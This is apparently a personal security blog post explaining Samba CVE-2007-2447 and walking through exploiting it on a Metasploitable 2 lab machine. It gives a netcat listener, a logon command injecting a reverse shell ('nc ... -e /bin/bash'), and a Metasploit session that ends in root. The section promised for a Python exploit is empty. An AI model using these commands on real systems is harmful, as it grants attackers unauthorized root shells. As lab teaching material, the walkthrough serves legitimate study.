---
layout: post
title:  "Samba CVE2007-2447"
categories: [Technical]
tags: [command execution, exploit, python]
draft: false
---

### Introduction

On May 7th 2007, a vulnerability found within Samba was reported via email to their security@samba.com mail alias. This bug was initially reported against the anonymous calls to the `SamrChangePassword()` [MS-RPC](https://en.wikipedia.org/wiki/Microsoft_RPC) function in combination with the "username map script" `smb.conf` option (which is not enabled by default). The bug was disclosed publicly on May 14th.

However, after investigation from developers at Samba they found the bug to be much broader noting that it also impacted remote printer & file share management. The root cause is due to passing unfiltered user input provided by MS-RPC calls to `/bin/sh` when invoking external scripts defined in `smb.conf`. Interestingly the vulnerability found with the "username map script" can be exploited without authenticatiton unlike the bug found in remote printer & file share management scripts, those require an authenticated session.

### So, how does it work?

In general there isn't much to discuss regarding this bug, it's fairly simple - by sending [shell metacharacters](http://faculty.salina.k-state.edu/tim/unix_sg/shell/metachar.html) into the username we trigger the bug which in turn allows us to send  aribitary commands to the device through the username field when attempting an SMB connection. As we mentioned earlier, no authenication is required to exploit this due to the fact that the option is used to map usernames prior to authentication and thus we can exploit this whilst being unauthenticated.

### Code Review

Sadly I was unable to find the source code that was affected for this CVE thus I cannot do a review on it, I'm not sure if anyone has it but if you do I'd greatly appreciate it! You can contact me on Twitter which is linked at the bottom of the page.

### Exploit

We can exploit this vulnerability using the [Metasploit module](https://www.exploit-db.com/exploits/16320/) however, this is another exploit that is easy to execute manually. As per usual we will exploit the vulnerability with Metasploit, manually and write our own script for the exploit.

It's worth noting in the below examples I am using [Metasploitable 2](https://metasploit.help.rapid7.com/docs/metasploitable-2)

#### Manual Exploitation

Exploiting this one manually has a few steps but it's not too tricky, it's not exactly efficient but it does the trick! Firstly we need to setup a listening on netcat, open a termninal and use `netcat -nvlp` the actual listener is defined with `l` so you might be wondering what all of this means? Well, `-n` tells Netcat not to resolve names, `-v` specifies to give us a verbose output when printing, `-l` specifies to create the listener as we mentioned and `-p` will create that listener on *any* local port.

```
root@LinxzSecKali:~# netcat -nvlp 4444
listening on [any] 4444 ...
```

Once we have the listener setup we are now going to open a new terminal and check the victims shares, we can do this with `smbclient -L //192.168.139.133` where `-L` will get a list of shares available on a host. We're using Metasploitable 2 as mentioned.

```
root@LinxzSecKali:~# smbclient -L //192.168.139.133
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            METASPLOITABLE
  
```
We're going to focus on the `tmp` folder & attempt to connect to the victim using `smbclient  //192.168.139.133/tmp` now you should receive the following back from the target.

```
root@LinxzSecKali:~# smbclient  //192.168.139.133/tmp
Enter WORKGROUP\root's password: 
Anonymous login successful
```

Next, we need to setup the reverse shell, you should see a prompt that looks like this after the previous command `smb: \>` this is good news, next we need to send `logon` to the target with logon ```logon/=`nc 192.168.139.135 4444 -e /bin/bash``` this time make sure you use your machines ip & not the targets! If we switch back to our terminal we created the netcat listener in you should see this.

```
root@LinxzSecKali:~# netcat -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.139.135] from (UNKNOWN) [192.168.139.133] 36513
```
Now you can execute commands and see that we've owned the machine! As I mentioned, there's a few steps for us to carry out but it's all relatively simple stuff. If in doubt just use `--help` :p


#### Metasploit Exploitation

Load Metasploit using `msfconsole` then run `use exploit/multi/samba/usermap_script` this will tell Metasploit to use that module, next you will need to set the `rhost` with the IP address of your target, you don't need to specify another payload for the bind shell as the Metasploit module will do this for you on your machines IP & port 4444. That's it! You now have a shell with whatever privliges the account Samba is running on has.

```
msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(multi/samba/usermap_script) > set RHOST 192.168.139.133
RHOST => 192.168.139.133
msf exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 192.168.139.135:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo iogIbtev3qMtahR5;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "iogIbtev3qMtahR5\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.139.135:4444 -> 192.168.139.133:44662) at 2018-11-17 15:35:19 +0000

id;
uid=0(root) gid=0(root)
whoami;
root
```


### Python Exploitation



### References

[Samba Security CVE2007-2447](https://www.samba.org/samba/security/CVE-2007-2447.html)

[Rapid 7 Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)

[CVE Details 2007-2447](https://www.cvedetails.com/cve/cve-2007-2447)

